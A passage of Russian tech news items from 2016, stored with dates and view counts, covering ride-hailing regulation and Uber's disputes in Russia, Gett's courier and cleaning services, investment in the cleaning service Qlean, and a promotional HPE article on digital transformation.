«Яндекс.Такси». Отмечалось, что ФАР в июле 2015 года направила обращения в ФАС, Генпрокуратуру и Общественную палату с просьбой проверить деятельность компаний-агрегаторов, работающих на рынке таксомоторных перевозок, на предмет соблюдения российского законодательства.\n\r\nПервый зампред комитета Госдумы по конституционному законодательству и государственному строительству Вячеслав Лысаков заявил РБК, что необходимо разграничить ответственность перевозчиков и агрегаторов: «Каждый должен отвечать за себя — диспетчерская служба, через которую клиент заказывает такси, гарантирует, что перевозку будет осуществлять водитель с лицензией. А водитель, осуществляющий заказ, отвечает за безопасность и качество услуг. Было бы странно, если бы диспетчер отвечал в случае ДТП с участием таксиста», — рассуждает он. \n\r\nЛысаков готовит собственную версию поправок. Он предлагает ввести в законопроект определение «диспетчерская служба», то есть законодательно сформировать определение бизнеса онлайн-агрегаторов. \n\r\nНа 25 апреля назначено согласительное совещание в правительстве по проекту поправок, на котором должны присутствовать представители Минтранса, Минэкономразвития, Минюста, правительства Москвы и тройки крупнейших онлайн-агрегаторов — «Яндекс.Такси», Gett, Uber, сообщил РБК собеседник в одном из крупных сервисов-агрегаторов такси.", {"day": "20", "month": "апреля", "time": "11:56"}, {"rate": 12, "views": 4000}], ["С 2015 года в Париже и Лондоне прошёл ряд забастовок, связанных с работой сервиса Uber. Французские таксисты сумели доказать факт недобросовестной конкуренции сервиса и получили за это 1,3 миллиона долларов. В России ситуация похожая: в январе 2016 года таксомоторные компании России начали юридическую борьбу против Uber и его аналогов. Не получив поддержки в ФАС, они написали письмо Дмитрию Медведеву.\n\n\nUber-пожары во Франции, лето 2015 года\n\r\nБорьба российских таксистов против Uber началась в январе 2016 года. По мнению служб такси, агрегаторы, подобные Uber и Gett, руководствуются внутренними правилами, которые не всегда соответствуют законодательству страны. Они уходят от налогов и перекладывают ответственность на водителей. И из-за таких компаний «в городах, на дорогах страны ежедневно гибнут десятки пассажиров такси».\n\r\nКомпания Uber, со своей стороны, утверждает, что её система представляет собой мобильное приложение для связи пользователей и водителей. При этом водители — независимые партнёры, как индивидуальные предприниматели, так и юридические лица, работающие согласно российскому законодательству. ООО «ГетТакси Рус» отвечает, что является российским юрлицом, которое ведёт деятельность с соблюдением всех законов и работает только с лицензированными перевозчиками.\n\r\nФедеральная антимонопольная служба ещё в июле 2015 года объявила, что не выявила каких-либо нарушений в работе «Яндекс.Такси», Uber и Gett. Проверку проводили после обращения Федерации автовладельцев России (ФАР). Жалобу тогда отправили и в прокуратуру с требованием проверить доплачивают ли сервисы водителям.\n\r\nНикаких проблем ФАС и прокуратура не нашли. Но официальные такси продолжают возмущаться, в том числе из-за цен, которые, по их мнению, являются демпинговыми. ФАР посчитала аргументацию ФАС «игнорирующей нормы действующего законодательство», и решила пожаловаться Дмитрию Медведеву, пишет РБК.\n\r\nВ письме главе правительства ФАР утверждает, что такие сервисы согласно 259-ФЗ «Устав автомобильного транспорта и городского наземного электрического транспорта» являются субъектами заключения договора фрахтования такси, а потому должны нести ответственность наравне с таксомоторными компаниями, в том числе по соблюдению антимонопольного законодательства при установлении тарифов за проезд. В письме Федерация привела оценку Московской торгово-промышленной палаты, согласно которой «Яндекс.Такси», Gett и Uber занимают почти 90% рынка.", {"day": "12", "month": "апреля", "time": "22:37"}, {"rate": 9, "views": 8400}], ["Сегодня, 6 апреля, «Яндекс.Такси» запускает услуги для корпоративных клиентов. Первым городом, в котором заработает корпоративный сервис, будет Москва. До конца 2016 года компания планирует запустить его еще в нескольких городах-миллионниках. «Корпоративные заказы — это примерно 10-15% рынка такси в мегаполисах», рассказали агентству ТАСС представители «Яндекс.Такси». – «К концу 2016 года мы рассчитываем занять долю в 10-15% в этом сегменте». По оценкам компании, корпоративный сегмент такси в Москве составляет около 6 миллиардов рублей в год. \n\r\nКонкуренты российского сервиса – Gett и Uber – уже работают в корпоративном сегменте. Gett обслуживает 2,5 тысячи корпоративных клиентов и лидирует в Москве по количеству поездок у юрлиц, приводят данные «Ведомости». На русскоязычном сайте Uber уже предлагается начать пользоваться Uber для бизнеса – сервис обещает сэкономить «до $1000 в год за каждого сотрудника».\n\r\nПредварительно «Яндекс.Такси» уже договорились о предоставлении бизнес-сервиса «с десятками компаний», среди которых банки, IT и медицинские компании, пояснили в пресс-службе сервиса. Схема работы в бизнес-сегменте универсальна: компания заключают соглашение с каким-либо сервисом, и ее работники используют этот сервис на определенных условиях. \n\r\nИспользование сервиса поможет контролировать расходы компаний-клиентов и сделать их более прозрачными, отмечает гендиректор «Яндекс.Такси» Тигран Худавердян. Тарифы для корпоративных клиентов аналогичны тарифам для простых пользователей плюс сумма НДС — от 200 рублей за такси эконом-класса до 400 рублей за бизнес-класс, минимальная стоимость поездки в аэропорт и обратно составляет 900 рублей.\nДля подключения услуги юрлицам необходимо заключить договор с «Яндекс.Такси» и указать телефоны сотрудников, которые ей будут пользоваться, чтобы они получили доступ к корпоративной учётной записи. После этого компания получает доступ к личному кабинету, где можно установить максимальную сумму расходов на месяц для каждого сотрудника. Оплата всех поездок проводится раз в месяц по безналичному расчёту. В корпоративном сегменте больше заказов по более дорогим тарифам – «комфорт» и «бизнес», уверен Худавердян. У Gett тарифы для «бизнес» в среднем соответствуют тарифам класса «комфорт».\n\r\nПо данным Аналитического центра при правительстве РФ, на сегодняшний день в России около 338 тысяч легальных машин такси, которые генерируют 441 миллиард рублей выручки в год.\n\r\n«Мегамозг» писал, что в январе 2016 года «Яндекс» должен был выделить в отдельные структуры два подразделения, приносящих ему нерекламный доход, — «Яндекс.Такси» и сервис объявлений «Яндекс.Вертикали». Выделение сервисов поможет диверсифицировать риски и снизить рекламную долю в структуре выручки «Яндекса», которая сейчас составляет почти 99%. \n\r\nВ категорию нерекламных доходов компании входят выручка от «Яндекс.Такси», платные подписки «Яндекс.Музыки» и другое. Структуру выручки от нерекламных доходов компания не раскрывает, но большая часть из них приходится на сервис «Яндекс.Такси», говорили ранее в «Яндексе».\n«Яндекс.Такси» был запущен в 2011 году. В настоящее время услугами сервиса можно воспользоваться в Москве, Санкт-Петербурге, Екатеринбурге, Новосибирске, ещё 11 городах России и Минске. Выручка «Яндекс.Такси» в 2015 году выросла в 3 раза по сравнению с уровнем 2014 года и составила 984 миллионов рублей.", {"day": "6", "month": "апреля", "time": "10:42"}, {"rate": 8, "views": 2300}], ["Российский венчурный фонд AddVenture повторно вложился в онлайн-сервис уборки Qlean.ru. В прошлом году сервис получил 70 миллионов рублей. В этот раз сумма в 3,5 раза больше. Полученные средства Qlean направит на региональную экспансию в города-миллионники. Помимо экспансии, компания выделит средства на маркетинг и добавление сопутствующих услуг (например, химчистки). \n\r\nПо мнению аналитиков, после сделки оценка компании должна достичь 1 миллиарда рублей.\n\r\n«Мы наблюдаем взлет популярности маркетплейсов в сегменте сервисов для дома во многих странах: в США, Великобритании, континентальной Европе, Турции, Юго-Восточной Азии, Индии и на Ближнем Востоке. Уборка — одна из ключевых вертикалей, и почти везде она развивается по Uber-модели», рассуждает управляющий партнер фонда Максим Медведев.\nСервис Qlean.ru создан в 2014 году дизайнерами Александром Коровиным и Никитой Павловым и бывшим руководителем банковского отделения Никитой Репешко. Сейчас сервис проводит более 500 уборок в день силами примерно 600 исполнителей. Оборот компании — около 50 миллионов рублей в месяц при среднем чеке 2,5 тысячи рублей. Зарабатывает за счет комиссии с заказа, которая, по словам собеседников «Коммерсанта» на венчурном рынке, составляет 20%.Qlean.ru также намерена консолидировать рынок уборки в России. В рамках своей внутренней платформы сервис предлагает клининговым компаниям присоединиться к нему в формате франшизы или M&A, указывает директор по маркетингу и совладелец Qlean Роман Кумар Виас. \n\r\nПостепенно покрывая миллионники, можно в течение пяти-семи лет расти по экспоненте, считает представитель фонда «Система масс-медиа» Анна Янчевская. По ее мнению, модель таких маркетплейсов хороша тем, что не требует больших инвестиций на старте. \n\r\n«Среди рисков — низкий контроль качества услуг, особенно в нашей стране, где нет лицензирования такой профессии, высокая текучка кадров, копируемость модели и низкий порог входа для других игроков. Как правило, при появлении большого количества конкурентов такие маркетплейсы начинают требовать существенных затрат на маркетинг, что сильно сказывается на их экономике», рассуждает госпожа Янчевская. \n\r\n«Мегамозг» писал, что 17 марта компания Gett (владеет сервисом GetTaxi) запустила в Москве новую функцию «Gett Уборка» для вызова клинера в квартиру. Сервис «Gett Уборка» запущен совместно с компанией Qlean. Возможность заказа уборки доступна для жителей Москвы в пределах МКАД, но в будущем география сервис будет расширена.\n\r\n«Qlean.ru — грамотно выстроенный сервис, но найти рациональное объяснение его популярности сложно», заявил управляющий директор Prostor Capital Алексей Соловьев «Коммерсанту». Он приводит в пример Uber, которая предложила принципиально новый подход к заказу такси, изменила представление о скорости подачи машины. Кроме того, у аудитории накопилась критическая масса смартфонов, без которых модель не заработала бы. \n\r\n«Как долго продлится мода на уборку? У популярности Qlean.ru нет технологических предпосылок, поэтому я бы оценил его шансы как 50 на 50 — может прорваться в российские единороги, а может повторить судьбу купонных сервисов», резюмирует он.\n\nДиректор по маркетингу и совладелец Qlean Роман Кумар Виас прокомментировал приведенное выше высказывание:\nСекрет нашей популярности, непонятный экспертам и аналитикам, заключается в нескольких вещах. \n\r\nВо-первых, мы строим собственную систему обучения для клинеров, вместо того, чтобы выступать обычной прослойкой между ними и заказчиками. Мы тратим время и деньги на тренинги, стажировки клинеров и автоматизацию процесса уборки. У нас есть библия на 30 страниц — “Путь клинера”, которая описывает процесс уборки и множество мелочей, которые каждый клинер должен знать, учитывать и уметь. \n\r\nВо-вторых, у нас есть собственная CRM-система с машинным обучением, которая позволяет собирать и анализировать огромное количество информации факторов о проделанных заказах, оценках, которые ставят клинерам клиенты, расходовании инвентаря и так далее. На базе этих знаний мы можем предугадывать дальнейшее взаимодействие клиентов и клинеров, видеть свои недочеты и тут же исправлять их.\n\r\nВ-третьих, в отличие от многих уберизированных сервисов, Qlean.ru всегда и в любой ситуации на стороне клиента. Мы страхуем имущество клиента на 5 миллионов рублей на время уборки, мы откликаемся на отзывы и замечания, мы всегда в диалоге с нашими заказчиками — конечно же, они это видят и чувствуют. И любят нас. \n\r\nИнтересный факт: в прошлом году каждый, кто хоть раз заказал уборку в среднем порекомендовал наш сервис 1,9 друзьям. Интересно было бы узнать, у кого из b2c сервисов на рынке этот показатель выше.\n\r\nВот и весь секрет, из которого родилась “мода на заказ уборки”, которая кому-то может показаться загадочной. Мы, кстати, уверены, что если не стали прародителями этой моды, то, как минимум, очень сильно поспособствовали тренду; и будем работать над этим и дальше.", {"day": "24", "month": "марта", "time": "15:51"}, {"rate": 7, "views": 2900}], ["Сегодня сервис по вызову такси Gett запустил в Москве новую функцию «Gett Уборка» для вызова клинера в квартиру. Сервис «Gett Уборка» построен на базе компании Qlean, которая предоставляет услуги по уборке домов и квартир с оформлением заказа через приложение.\n\r\nВозможность заказа уборки доступна для жителей Москвы в пределах МКАД, но в будущем география сервис будет расширена. Стоимость уборки начинается с 1990 руб. для однокомнатной квартиры, двухкомнатной с 2490 руб., трёхкомнатной с 2990 руб. и четырёхкомнатной с 3490 руб. Помимо этого пользователи могут заказать уборку с дополнительными опциями в виде уборки духовки (+ 400 руб.), балкона (+ 600 руб.), мойки окна (+ 700 руб. за окно), глажки белья (+ 600 руб. в час) и других. Оплата услуг возможна только при помощи карты.\n«Год назад Gett объявила о ребрендинге и запуске множества повседневных услуг в едином мобильном приложении. Более трёх лет мы помогали пользователям экономить время, когда речь шла о такси, сегодня мы можем в считанные минуты привезти обед на двоих, починить разбившийся iPhone или доставить посылку. Уборка квартиры — одна из постоянных домашних обязанностей, отнимающих много времени и сил. Мы, как и наш партнёр Qlean, уверены — доверить уборку квартиры можно профессионалам, а освободившееся время лучше потратить на действительно приятные занятия», — заявил генеральный директор Gett в России Виталий Крылов.\r\nБизнес-модель по интеграции таких сервисов не нова — в Gett уже появилась возможность доставки суши или ремонт iPhone. Процентное разделения прибыли с услуги не сообщается, что не позволяет оценить прибыльность интеграции для каждого из сервисов. В этом случае может выиграть и Qclean за счёт расширения пользовательской базы и Gett благодаря интеграции новой функции с потенциалом привлечения новых клиентов.", {"day": "17", "month": "марта", "time": "14:53"}, {"rate": 7, "views": 3300}], ["В октябре 2015 года корпорация HP объявила о разделении на две компании — HP Inc. и Hewlett Packard Enterprise. В ближайшее время выйдет ряд публикаций, где будет рассказано о новой стратегии HPE в части программных решений. Представляем вашему вниманию вводную статью.\n\n\r\nПо мнению отраслевых экспертов, 2016-й станет «годом цифровых преобразований». Очевидно, что промедление чревато множеством негативных последствий, среди которых — несвоевременное реагирование бизнеса на требования рынка, а также проблемы, связанные с необходимостью удержания клиентов и сохранения их лояльности. Чтобы добиться заметного успеха, требуется ускорить объединение технологий и новых идей в рамках цифровой трансформации. При этом к проектам трансформации руководители предприятий зачастую относятся как к «цифровой рулетке», считая их чрезвычайно рискованными, а результат — непредсказуемым.\n\r\nДействительно, успеху цифровых проектов препятствует их сложность: помимо технологических проблем, возникают организационные, в том числе конфликт интересов. Только одна из четырех компаний, ступивших на путь цифровой трансформации, действительно уверена в правильности принимаемых решений, а две компании из трех открыто признают, что подобные проекты, реализуемые у них, скорее являются авантюрой.\n\r\nПричина сомнений понятна: цена ошибки крайне высока. Именно этот факт предопределяет растущую востребованность консалтинговых услуг. Согласно оценкам IDC, к 2019 году рынок цифровой трансформации достигнет 2 млрд долл.\n\r\nЦифровая трансформация, по определению IDC, должна предусматривать проведение инновационных реформ по крайней мере в одной из следующих областей: в подходах к управлению организацией (например, работе с кадрами) во взаимодействии с клиентами, операционной модели, управлении информацией. Наибольшие инвестиции в трансформацию — почти половина планируемого объема — будут связаны с поддержкой изменений в области операционных моделей. Они способствуют достижению высокой эффективности бизнеса, обеспечивая подключение к цифровой среде продуктов и услуг, активов, людей и торговых партнеров. Генерируемая при этом информация не только позволяет повысить качество принимаемых решений, но и сама по себе монетизируема.\n\nМеняться придется всем\r\nВ экономике происходят постоянные изменения, и фактически мы имеем дело с новым стилем ведения бизнеса, новой реальностью. В этих условиях ИТ оказывается основным двигателем, позволяющим предприятиям меняться и работать с применением передовых подходов. Можно привести массу примеров. \n\r\nПосмотрите, как изменилась телекоммуникационная индустрия с приходом Viber, WhatsApp и других сервисов связи и предоставления контента. Рынок оказался перекроен: основной поток прибыли перешел от голосовых услуг в сторону передачи данных. Не менее радикальные перемены произошли в таксомоторном бизнесе с приходом сервисов «Яндекс.Такси», Uber, Gett: упали цены, преобразованиям подверглись и сами процессы. Пришлось перестраиваться и гостиничной, и туристической отраслям: с появлением агрегаторов поменялась поведенческая модель как поставщиков услуг, так и их заказчиков. \n\r\nЭти яркие примеры говорят о революционных изменениях, которые будут продолжаться, и этот процесс затрагивает самые разные сферы. Меняться придется всем нам.\n\r\nМожно возразить, что корпоративный бизнес гораздо стабильнее, но это не совсем так. Большинство компаний-клиентов чаще всего получают основные доходы в том или ином сегменте потребительского рынка, а пользователи очень быстро реагируют на появление новых технологий. И хотя крупные организации априори не столь поворотливы, они тоже вынуждены меняться, поскольку в нынешнем цифровом водовороте все взаимосвязано.\n\r\nКорпоративные примеры очень просты и иллюстративны: зачастую бизнес-подразделению какого-либо банка проще и выгоднее приобрести ИТ-сервисы у сторонней компании, из облака, чем поручать разработку штатным сотрудникам. И это происходит все чаще. Причина проста: на любую инициативу бизнес-подразделения ИТ-департамент наверняка ответит: «Надо подождать, для выполнения такой задачи потребуется немало времени». Но бизнес готов ждать всё реже. \n\r\nДействительно, возможности ИТ-департаментов — монополистов в области предоставления ИТ-услуг для своих компаний — существенно ограничены, особенно в скорости предоставления новых сервисов. Именно поэтому облака начали восприниматься пользователями как привлекательная альтернатива традиционным сервисам. Бизнес-заказчики «голосуют рублем», и деньги идут напрямую облачным провайдерам, зачастую в обход ИТ-бюджетов.\n\r\nЭто простой пример того, что аналитики Gartner называют «бимодальными ИТ», существующими в двух ипостасях: централизованной части, имеющейся в каждой компании, и гибкой, приходящей извне. \n\nЧетыре проблемы трансформации\r\nПервая проблема цифровой трансформации современной компании заключается в изменении её ИТ-инфраструктуры. Это данность, которую придется принять: совсем скоро все крупные предприятия будут «жить» если не полностью в облаке, то в гибридной инфраструктуре, получая какие-то сервисы внутри своей организации, а какие-то — извне. И проблема состоит в том, что качество, безопасность и целостность услуг, приобретаемых в разных источниках, различна.\n\r\nВсе потребляемые компанией сервисы должны быть одинаково безопасными, интегрируемыми, контролируемыми. В идеале ИТ-департамент выполняет роль сервис-брокера в такой гибридной инфраструктуре, осуществляя контроль всех внешних услуг, интегрируя их внутри себя. Его задача — оптимально распределить нагрузку между физической инфраструктурой, частными и публичными облаками, предоставляя бизнес-подразделениям сервисы с заранее определенным качеством, соответствующим корпоративным стандартам. При этом под качеством понимается не только надежность и отказоустойчивость, но и защищенность, а также масса других требований, вплоть до стандартного внешнего вида, когда каждое приложение для пользователей выглядит как все остальные информационные системы, а не нечто чужеродное. \n\r\nВторая проблема заключается в защите цифровых активов. Это понятная и все более актуальная задача: активов становится больше, а их ценность и сложность возрастают. Более того, гибридная инфраструктура подразумевает и распределенность — активы могут находиться вне периметра организации. \n\r\nНе следует забывать и о том, что вооруженность современных злоумышленников сильно выросла. Если раньше весовые категории были различными — хакеры не могли себе позволить использовать мощности корпоративного уровня, то сейчас бот-сеть, сравнимая по мощности с корпоративными ресурсами, стоит копейки. Защищаться стало тяжелее, и этому вопросу приходится уделять огромное внимание.\n\r\nТретья проблема — эффективное использование информации, имеющейся в распоряжении компаний. Данные становятся главной валютой цифровой экономики, и ключевой проблемой является их монетизация. Реализация концепции управления предприятием на основе данных (Data-Driven Enterprise) стала неотъемлемой частью цифровой трансформации, а интерес к проектам Больших данных для многих организаций уже давно перешел из теоретической плоскости в практическую. \n\r\nОтдельно следует сказать о роли в цифровой трансформации сотрудников. Новые бизнес-процессы потребуют принципиально другой корпоративной культуры. Цифровизация подразумевает полную прозрачность процессов, что предъявляет новые требования к взаимодействию и использованию информации в текущей работе.\n\r\nТаким образом, персонал снова оказывается в центре внимания. Как подчеркивают аналитики Accenture в исследовании Technology Vision 2016, очень часто компании, внедряющие технологии формально, измотаны «цифровой гонкой». Они испытывают определенный культурный шок от осознания того, что отставать от конкурентов нельзя ни в коем случае. Те, кто делает ставку на людей, получают возможность создавать новые бизнес-модели, позволяющие менять правила цифровой игры в свою пользу.\n\r\nКонкурентное преимущество быстро адаптирующегося персонала очевидно для всех. Для успешной работы в цифровой среде необходимы такие его характеристики, как наличие глубоких экспертных знаний в специализированных областях, быстрая обучаемость и способность быстро переключаться между разными задачами.\n\r\nПри этом важно обеспечить продуктивность работы пользователей. Сотрудник должен иметь возможность пользоваться одинаковым функционалом как на рабочем месте, так и в любой другой локации. Надо стремиться выстраивать бизнес-процессы, информационные системы и доступ к ним таким образом, чтобы высокая эффективность его труда сохранялась и при удаленной работе.\n\nПройти путь вместе\r\nТак или иначе, любой современной компании придется сталкиваться с проблемами цифровой трансформации. Однако все они взаимосвязаны. Желание решать вопросы комплексно делает актуальным использование внешних сервисов: все проблемы могут быть закрыты — как с точки зрения получения консалтинговых услуг, так и в плане доступа к программным продуктам.\n\r\nПонимание необходимости изменений растет, и отдельные отрасли активно обращаются с запросами на предоставление подобного рода сервисов. Например, многие крупнейшие российские банки уже проявляют к ним немалый интерес. Однако следует понимать, что успех трансформации в первую очередь определяется готовностью компании к изменениям, а не только желанием попробовать что-то новое и наличием соответствующей возможности у внешних поставщиков. Когда мы предлагаем свою помощь, речь идет прежде всего о взаимодействии. У нас есть знания и опыт, но у компаний, как правило, уже имеются планы по развитию собственного бизнеса, поэтому каждый трансформационный проект уникален. Этот путь мы можем пройти вместе с вами, и уверены, что он завершится успешно.\n\nТрансформация как стратегия\r\nКорпоративная стратегия Hewlett Packard Enterprise определяет четыре ключевых направления цифровой трансформации, а именно: трансформация в гибридную инфраструктуру (Transform to a hybrid infrastructure), защита цифровых активов (Protect your digital enterprise), решения на основе данных предприятия (Empower the data-driven organization) и продуктивность (Enable workplace productivity). \n\r\nПод трансформацией в гибридную инфраструктуру подразумевается обеспечение прозрачности, управляемости и управление сервисами. HP всегда специализировалась на разработке решений для управления ИТ и сервисами и в данной дисциплине чувствует себя, как старожил, вполне комфортно. Сейчас идет планомерное развитие этих технологий, с которых и начинал формироваться портфель программных продуктов HP. Вполне уместно применить к ним термин «ERP для IT». Если ИТ-департамент представить как организацию, то в портфеле решений HPE есть полный набор технологий для управления всеми ее составляющими — от инфраструктуры до финансов и взаимодействия с вендорами. Решения HPE отличаются тем, что с их помощью одинаково хорошо удается управлять как физической, так и виртуальной инфраструктурой, а при наличии гибридной инфраструктуры такая возможность чрезвычайно необходима. \n\r\nЧто касается защиты цифровых активов, то речь идет о портфеле Enterprise Security Productsи в первую очередь о создании центров управления ИТ-безопасностью (SOC), а также о тестировании ПО на уязвимости начиная с самых ранних этапов разработки, когда анализируется код приложения, и в ходе развертывания — при проверке устойчивости готового приложения или портала ко всем известным на данный момент уязвимостям. Кроме того в портфеле НРЕ есть целый ряд решений по обеспечению непрерывности бизнеса, повышения доступности данных, их резервного копирования и восстановлению в случае необходимости.\n\r\nЧтобы обеспечить поддержку направления решений на основе данных предприятия, была сформирована платформа для обработки Больших Данных HPE Big Data Platform, которая предоставляет многим заказчикам возможность построить эффективные аналитические системы для работы как со структурированной информацией, так и с неструктурированной — с данными соцсетей, голосовыми записями или видео.\n\r\nГоворя о продуктивности, мы в первую очередь подразумеваем управление мобильными приложениями и обеспечение их качества — отказоустойчивости, нагрузоустойчивости и функционального соответствия ожиданиям. Зачастую это становится критически важным для достижения успеха в масштабе всей компании, особенно если мобильные приложения являются одним из средств привлечения дополнительных клиентов. Отдельно следует обратить внимание на безопасность мобильных приложений: в них обрабатываются огромные объемы личных данных пользователей и финансовая информация, что ведет к стремительному росту числа заказчиков, интересующихся именно вопросами безопасности.\r\nВ последующих статьях мы подробнее расскажем о каждой из названных областей трансформации и средствах, которые можно использовать для поддержки этого процесса.", {"day": "15", "month": "марта", "time": "16:34"}, {"rate": 7, "views": 5000}], ["Сегодня, 25 февраля, компания Gett запустила сервис Gett Курьер в Москве. Услуга будет действовать в Москве с 9:00 до 21:00 в будние и выходные дни, а ее стоимость составит всего 400 рублей в пределах ТТК и 600 рублей в пределах МКАД. \r\nВодители Gett будут доставлять посылки по заказу пользователей. В пресс-релизе компании сказано, что время ожидания приезда водителя не будет превышать 20 минут.\n\r\nЧтобы воспользоваться услугой нужно выбрать класс “Курьер” в мобильном приложении Gett, указать адрес отправителя, телефон и адрес получателя. Проследить весь маршрут доставки в реальном времени можно будет в самом приложении. По прибытии на место курьер позвонит получателю по указанному телефону, говорится в сообщении компании. Оплатить услугу можно только с помощью банковской карты.\n\r\n«Запуск «Gett Курьер» поможет решить множество задач, будь то отправка букета, подарка или важных документов. \r\nCервис будет востребован не только среди частных пользователей: сейчас мы разрабатываем курьерский сервис для корпоративных клиентов Gett, а в перспективе – уникальную для нашего рынка услугу –доставку покупок из интернет-магазинов в течении часа», заявил генеральный директор Gett в России Виталий Крылов.\n\r\n1 февраля компания Gett запустила сервис доставки в Лондоне. Стоимость одной доставки составляет 6 фунтов стерлингов для центра города, а при других поездках рассчитывается в зависимости от удалённости финальной точки доставки.\n\r\nВ конце апреля 2015 года Gett анонсировала запуск новых сервисов в едином мобильном приложении и позволила пользователям получать множество необходимых в повседневной жизни услуг быстро и просто. Среди основных категорий услуг, которые планирует развивать Gett, сфера транспорта, питания, красоты, медицины и услуг для дома. С июля 2015 в приложении Gett пользователям Москвы доступен сервис Gett Суши. В ноябре Gett запустила услугу срочного ремонта iPhone — Gett iМастер.\n\r\n24 февраля 2016 года в Бангкоке компания Uber запустила новый сервис под названием UberMOTO. \n\r\nМототакси очень популярны в Таиланде и других странах региона – они отличаются не только дешевизной, но и большей мобильностью в условиях уличных пробок, пишут «Ведомости». Сервис предусматривает оплату с помощью банковской карты или наличными с минимальным тарифом в 10 батов ($0,28).\n\r\nUber придется конкурировать в Юго-Восточной Азии с другими службами по вызову мототакси – Grab и Go-Jek.\n\r\nСтраны Юго-Восточной Азии представляют большой интерес для компаний по вызову транспортных средств: его совокупное население – порядка 600 миллионов человек, многие из них живут в крупных городах и активно пользуются смартфонами. \n\r\n5 февраля Uber запустился в Минске. В середине февраля планы по выходу в Минск появились и у сервиса «Яндекс.Такси».", {"day": "25", "month": "февраля", "time": "12:07"}, {"rate": 8, "views": 3400}], ["Сегодня Uber обновил пользовательское соглашение — в обновлённой версии которого прописан отказ от ответственности. Вместе с этим компания утверждает, что более не несёт ответственности за качество услуг и безопасность пассажиров. С учётом всех правок новое соглашение Uber прямо противоречит конституции РФ.\n\r\nКомпания прописала особенности работы с частными клиентами, в которых упоминает, что не является перевозчиком и не несёт за перевозки никакой ответственности. Более того, Uber снял с себя ответственность за любые «косвенные, случайные непредвиденные, фактические, штрафные или последующие убытки, утерянные данные, телесные повреждения или материальный ущерб, любые убытки, обязательства или ущерб». Все подписавшие соглашение также признают, что могут пользоваться поставщиками транспортных услуг без официальной лицензии. Согласно новым правилам исковые претензии пользователей к Uber не могут превышать 500 евро по всем пунктам ущерба или любых других убытков.\n\n«У компании появились новые сервисы — например, UberEATS (доставка еды) и UberRUSH (доставка товаров из магазинов), поэтому Uber было необходимо “прописать условия ответственности” перед пользователями. “Принципиальных изменений в правилах нет”», — заявила представитель Uber в России Евгения Шипова изданию «РБК».\n\r\nУ конкурирующих сервисов в виде Gett, «Яндекс.Такси» и других присутствуют похожие положения в договоре, но в отличие от Uber они работают с лицензированными перевозчиками. В этом случае у клиентов остаётся возможность подать иск против них при возникновении любых проблем.\n\r\nСовсем недавно именно из-за этого пункта и возникли разногласия между правительством Москвы и Uber — руководитель столичного департамента транспорта Максим Лискутов заявил о возможном запрете Uber. Пока руководство Uber так и не предоставило однозначного ответа на предложение внести правки в соглашение и ограничиться работой только с лицензированными водителями. Компании дали ещё несколько недель на рассмотрение этого предложения, а впоследствии против Uber могут подать иск с требованием запретить сервис на территории Москвы. В результате рассмотрения возможного соглашения напряжение в отношениях между компанией и властями столице немного снизилось.\n\r\nПохожее отношение к Uber складывается и в некоторых других странах. Так, во Франции местные таксисты устроили забастовку, во время которой заблокировали движение и устроили погром автомобилей водителей Uber. Теперь же Uber приостановила работу приложения во Франции с 11 утра вторника до 3 часов ночи этой среды в протест против решений правительства на работу сервиса в стране.", {"day": "9", "month": "февраля", "time": "19:16"}, {"rate": 9, "views": 9600}], ["Сервисы такси активно развиваются — капитализация и популярность Uber во многих странах это лишний раз доказывает это. Несмотря на востребованность сервиса и в России, власти Москвы могут запретить его из-за неподписанного соглашения о раскрытии маршрутов такси.\n\r\nСоглашение призвано урегулировать спорные моменты для властей Москвы во взаимодействии Uber с таксистами, но его согласование затянулось на несколько месяцев. По словам заместителя мэра Москвы Максима Лискутова, представители компании откладывают подписание уже несколько месяцев подряд.\n\n«Первое: компания Uber обязывается работать только с легальными таксистами, которые имеют разрешение на таксомоторную деятельность. И второе: они будут передавать нам данные по движению их автомобилей такси по городу. Данные будут обезличены — нам нужны только треки. Uber были готовы подписать такое соглашение до конца 2015 года. Потом они, ссылаясь на свои корпоративные процедуры, попросили нас до конца января продлить этот период. И вот последняя просьба их была еще подождать десять дней — опять ссылаются на свои корпоративные процедуры. \n\r\nЕсли Uber не подпишет соглашение, обратимся с требованием запретить его работу в Москве», — заявил Лискутов в интервью изданию «Газета.ru».\n\r\nКонкурирующие с Uber сервисы Gett и «Яндекс.Такси» согласились передавать обезличенные данные о машинах такси и их занятости. Если верить Лискутову, то эта информация используется для анализа загруженности дорог. Недовольны работой Uber не только городские власти — представители федерации автомобилистов России обращались в ФАС с целью проверки сервисов заказа такси ещё в прошлом году.\n\r\nАналогично акции протеста против Uber проводили и таксисты во Франции, когда движение по всему городу было практически парализовано из-за нескольких тысяч митингующих. Помимо цивилизованного митинга некоторые из таксистов прибегали и к более радикальным методам, сжигая покрышки и перекрыв маршруты к аэропортам, но это так и не привело к полному запрету Uber в стране.\n\n\n\nP.S. А Uber тем временем провел ребрендинг и обновил иконку, а также анимацию загрузки своего приложения.\n\nP.P.S. Во время интервью для «Говорит Москва» Лискутов поделился решением предоставить Uber еще месяц на отказ на использование услуг нелегальных таксистов.\n\n«К сожалению, федеральное законодательство четко пока не регулирует работу интернет-агрегаторов такси. Мы вынуждены заключать допсоглашения с компаниями. Очень рассчитываю на то, что и компания Uber, такая международная компания, уверен, стремящаяся работать в рамках закона, такое соглашение с нами подпишет. Думаю, что в ближайший месяц если решение будет, то соответственно будет. Если нет, то у нас есть законное право и обязанность обратиться в правоохранительные органы и начать процедуру, связанную с запрещением деятельности», — поделился Лискутов с журналистами.", {"day": "2", "month": "февраля", "time": "23:10"}, {"rate": 8, "views": 5100}], ["Сервисы такси за последние годы претерпели множество изменений, многие из которых связаны с расширением списка доступных услуг. Современные приложения для сервисов такси стали своеобразными агрегаторами услуг — от доставки суши и бургеров на дом, заканчивая полноценными сервисами доставки любых товаров.\n\r\nТеперь на рынке появился новый игрок — Gett Courier, который является простой дополнительной опцией в популярном сервисе Gett. Если верить представителям компании, то пока из доступных локаций присутствует только Лондон, но при успешной практике список поддерживаемых городов планируется расширить. Стоимость одной доставки составляет 6 фунтов стерлингов для центра города, а при других поездках рассчитывается в зависимости от удалённости финальной точки доставки. Для оптимальной скорости доставки Gett собирается нанимать водителей на скутерах, из-за чего введены определённые ограничение на вес посылки — при помощи Gett Courier можно отправить малогабаритные вещи весом не более 5 кг.\n\n\n\r\nКонкурентоспособность Gett стоит сравнивать с UberRUSH и другими аналогами. Так, в Сан-Франциско одна поездка в радиусе 1 мили обойдётся в $6 c доплатой в $3 за каждую дополнительную милю при выходе из заданной зоны. К плюсам UberRUSH также относится и возможность интеграции собственного API для владельцев крупных компаний. Это позволяет наладить поставку мелкогабаритных товаров в 